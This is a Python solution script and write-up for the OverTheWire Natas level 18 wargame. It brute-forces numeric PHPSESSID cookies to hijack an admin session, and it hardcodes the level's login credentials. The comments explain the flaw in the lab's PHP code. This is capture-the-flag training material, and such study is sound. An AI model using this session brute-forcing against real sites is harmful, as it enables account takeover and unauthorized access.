#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
#Custom Headers


error='Login as an admin to retrieve credentials'


#Payload
payload=''
path='/?debug=true&username=admin&password=admin'
url=host+path

content=error
final=''
print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
def getflag():
	for num in range(119,650):
		global final
		global error
		global content
		print(f'[-] Trying {str(num)}')
		somevalue=str(num)
		custom_headers={"Cookie":f"PHPSESSID={somevalue}"}
		session=requests.Session()
		response=requests.get(url,headers=custom_headers,auth=(basic_username,basic_password))
		content=response.text
		status=response.status_code
		headers=response.headers

		if (error not in content):
			print(f'\t[+] Please check {str(num)}\n\n\n')
			final+=str(num)+','
			cleanheaders(headers)
			print(content)
			flag=content.split(' ')[48:51]
			
			print('\n'+''.join(flag))
			return headers
		else:
			pass


getflag()




#WRITEUP
#This time we get a form telling us to login as admin
#Checking the source code,The program : 
#Start session function
#1.Checks for the PHPSESSID cookie
#2.Checks if the cookie is valid with is_numeric(cookie) Meaning cookie has to be a numeric value
#3. if 1 and 2 are true then start session
#4. Check if admin exists in the $SESSION
#4.If it does not exist set $SESSION["admin"] = 0 and return true

#Print flag function
#if $SESSION['admin'] = 1 then we can get the flag
#But for us to get the admin session variable to 1 ,we to get the function below to return 1

			# function isValidAdminLogin() { /* {{{ */
			#     if($_REQUEST["username"] == "admin") {
			#     /* This method of authentication appears to be unsafe and has been disabled for now. */
			#         //return 1;
			#     }

			#     return 0;
			# } 

#Which seems impossible since i dont know a way to break before reaching return 0;
#Then i saw $maxid = 640; // 640 should be enough for everyone 
# This is a small value,so i thought of brute force ,Assuming the admin is logged in ,we can get the flag

#And sure we get the flag